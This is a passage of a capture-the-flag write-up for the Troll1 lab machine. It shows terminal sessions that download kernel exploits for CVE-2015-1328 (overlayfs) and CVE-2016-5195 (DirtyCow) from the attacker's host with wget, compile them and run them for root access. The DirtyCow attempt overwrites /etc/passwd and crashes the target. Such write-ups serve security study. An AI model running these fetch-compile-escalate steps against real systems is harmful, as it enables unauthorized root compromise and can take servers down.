+   Download URL: https://www.exploit-db.com/download/37292
+
+----------------
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh overflow@192.168.1.23
+overflow@192.168.1.23's password: 
+
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+<SNIP>
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+Last login: Sun Sep 16 16:00:30 2018 from 192.168.1.8
+Could not chdir to home directory /home/overflow: No such file or directory
+
+$ cd /tmp
+
+$ wget http://192.168.1.8:8000/CVE-2015-1328-37292.c
+--2018-09-16 16:12:51--  http://192.168.1.8:8000/CVE-2015-1328-37292.c
+Connecting to 192.168.1.8:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4969 (4.9K) [text/plain]
+Saving to: ‘CVE-2015-1328-37292.c’
+100%[======================================>] 4,969       --.-K/s   in 0s      
+2018-09-16 16:12:51 (591 MB/s) - ‘CVE-2015-1328-37292.c’ saved [4969/4969]
+
+$ gcc CVE-2015-1328-37292.c -o Overlayfs
+
+$ ls -al
+total 28
+drwxrwxrwt  2 root     root      4096 Sep 16 16:13 .
+drwxr-xr-x 21 root     root      4096 Aug  9  2014 ..
+-rw-rw-r--  1 overflow overflow  4969 Jul 15 11:58 CVE-2015-1328-37292.c
+-rwxrwxr-x  1 overflow overflow 12163 Sep 16 16:13 Overlayfs
+
+$ ./Overlayfs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+
+# id
+uid=0(root) gid=0(root) groups=0(root),1002(overflow)
+
+# cd /root
+
+# ls  
+proof.txt
+
+# cat proof.txt
+Good job, you did it! 
+
+702a8c18d29c6f3ca0d99ef5712bfbdc
+#
+
+
+=================================================================================================================================
+Step 4. Privesc to root
+
+Method 3 - DirtyC0w exploit (CVE-2016-5195)
+=================================================================================================================================
+
+I tried the DirtyC0w exploit (CVE-2016-5195) that was identified by the script 'Linux-exploit-suggester.sh'
+
+[+] [CVE-2016-5195] dirtycow
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
+   Download URL: https://www.exploit-db.com/download/40611
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-5195] dirtycow 2
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847.cpp
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh overflow@192.168.1.23
+overflow@192.168.1.23's password: 
+Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)
+<SNIP>
+
+$ cd /tmp
+
+$ wget http://192.168.1.8:8000/dirtycow.c
+
+$ gcc -pthread dirtycow.c -o dirtycow -lcrypt
+
+$ ls -al
+total 36
+drwxrwxrwt  2 root     root      4096 Sep 16 15:54 .
+drwxr-xr-x 21 root     root      4096 Aug  9  2014 ..
+-rw-rw-r--  1 overflow overflow   106 Sep 16 15:31 cleaner.py
+-rwxrwxr-x  1 overflow overflow 12640 Sep 16 15:54 dirtycow
+-rw-rw-r--  1 overflow overflow  4795 Jul 15 16:20 dirtycow.c
+
+$ ./dirtycow
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+audit:auGLwsStYnGhg:0:0:pwned:/root:/bin/bash
+
+mmap: b7754000
+
+=> It seems to work but the Linux server crashed.... FAILURE
+
+root@Security-Audit-01:~/Desktop/CTFs/Troll1# ssh overflow@192.168.1.23
+ssh: connect to host 192.168.1.23 port 22: No route to host
